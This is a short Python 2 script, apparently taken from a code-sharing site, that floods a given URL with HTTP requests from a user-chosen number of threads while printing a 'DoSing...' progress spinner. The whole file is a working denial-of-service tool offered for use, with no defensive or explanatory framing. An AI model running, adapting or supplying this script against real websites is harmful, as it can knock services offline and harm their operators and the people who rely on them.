# -- coding: UTF-8 --


import thread
import urllib2
import sys
import time


def usage():
  print 'Usage: python ' + sys.argv[0] + ' <url> <threads>'
  sys.exit()


def reloader(numthread):
  url = sys.argv[1]
  numreloads = 0
  while True:
    try:
      urllib2.urlopen(url)
      numreloads = numreloads + 1
    except KeyboardInterrupt:
      sys.exit('\nProcess aborted.')


def splash():
  print 'welcome to http://www.jb51.net/codes '
if len(sys.argv) < 3:
  usage()


if __name__ == '__main__':
  splash()
  print '[!] DoSing ' + sys.argv[1] + ' with ' + sys.argv[2] + ' threads.'
  for reloadspawn in range(0, int(sys.argv[2])):
    thread.start_new_thread(reloader, (reloadspawn,))
  sys.stdout.write('')
  dosind = ['-', '\\', '|', '/']
  dosstat = 0
  while True:
    try:
      sys.stdout.write('\r' + dosind[dosstat % 4] + ' DoSing...')
      sys.stdout.flush()
      dosstat = dosstat + 1
      time.sleep(0.25)
    except KeyboardInterrupt:
      sys.exit('\nProcess aborted.')